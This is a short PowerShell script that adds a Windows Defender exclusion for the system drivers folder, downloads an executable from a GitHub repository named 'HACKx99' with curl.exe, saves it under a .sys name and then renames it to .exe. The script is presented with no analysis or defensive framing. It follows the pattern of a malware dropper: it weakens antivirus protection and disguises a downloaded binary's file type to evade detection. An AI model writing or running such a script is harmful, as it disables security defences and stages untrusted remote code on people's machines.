# Add Windows Defender exclusion for drivers folder (requires admin)
Add-MpPreference -ExclusionPath "C:\Windows\System32\drivers"

# Define paths and GitHub URL
$downloadPath = "C:\Users\Yes\Desktop\Testing"
$sysFile = "$downloadPath\tool.sys"
$exeFile = "$downloadPath\tool.exe"
$githubUrl = "https://github.com/HACKx99/Testing/raw/refs/heads/main/testing.exe"

# Ensure directory exists
New-Item -ItemType Directory -Force -Path $downloadPath | Out-Null

# Download as .sys file using curl.exe (CMD method)
& curl.exe -L -o "$sysFile" $githubUrl

Write-Output "Downloaded to $sysFile. Waiting 5 seconds before renaming..."

# Wait 5 seconds
Start-Sleep -Seconds 5

# Rename .sys to .exe
Rename-Item -Path $sysFile -NewName $exeFile

Write-Output "Renamed to $exeFile"
